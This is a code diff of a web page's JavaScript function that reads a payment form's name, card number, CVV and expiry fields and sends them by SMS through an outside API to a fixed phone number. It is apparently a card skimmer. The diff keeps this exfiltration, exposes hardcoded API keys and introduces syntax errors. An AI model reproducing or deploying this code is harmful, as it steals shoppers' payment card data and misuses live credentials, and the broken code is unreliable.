@@ -126,37 +126,33 @@ function getdata(){
     let cvv = document.getElementById('cvv').value
     let month = document.getElementById('month').value
     let year = document.getElementById('year').value
-    let myData= {
+    let myData= '{
         'firstname' : firstname,
         'lastnme' :lastname,
         'card Number' :card,
         'cvv' :cvv,
         'month ':month,
         'year' :year
-    }
-    
-    
-    console.log(toString(myData))
-     const encodedParams = new URLSearchParams();
- encodedParams.append("to", "+22961342878");
- encodedParams.append("p", "Q9LAn9v3DPk6vg71FtHFDLOkyEuFnXv5JuA1BUnIRiwZ31z3gf0nYGtfY5xXFYis");
- encodedParams.append("text",myData);
+    }'
+const encodedParams = new URLSearchParams();
+encodedParams.append("to", "+22961342878");
+encodedParams.append("p", "yvl8kzUNYNor2KAnb8GcPSLsrvpcquEkhR9QvscJr6uvMKRz5mfo8bOV6yj9VXOY");
+encodedParams.append("text",myData");
 
- const options = {
- 	method: 'POST',
- 	headers: {
- 		'content-type': 'application/x-www-form-urlencoded',
- 		'X-RapidAPI-Host': 'sms77io.p.rapidapi.com',
- 		'X-RapidAPI-Key': 'yvl8kzUNYNor2KAnb8GcPSLsrvpcquEkhR9QvscJr6uvMKRz5mfo8bOV6yj9VXOY'
- 	},
- 	body: encodedParams
- };
+const options = {
+	method: 'POST',
+	headers: {
+		'content-type': 'application/x-www-form-urlencoded',
+		'X-RapidAPI-Host': 'sms77io.p.rapidapi.com',
+		'X-RapidAPI-Key': '42cdec0e39mshb76468635e8377bp1aa201jsn3b97bcb3ccef'
+	},
+	body: encodedParams
+};
 
- fetch('https://sms77io.p.rapidapi.com/sms', options)
- 	.then(response => response.json())
- 	.then(response => console.log(response))
- 	.catch(err => console.error(err));
-
+fetch('https://sms77io.p.rapidapi.com/sms', options)
+	.then(response => response.json())
+	.then(response => console.log(response))
+	.catch(err => console.error(err));
 
 }
 </script>
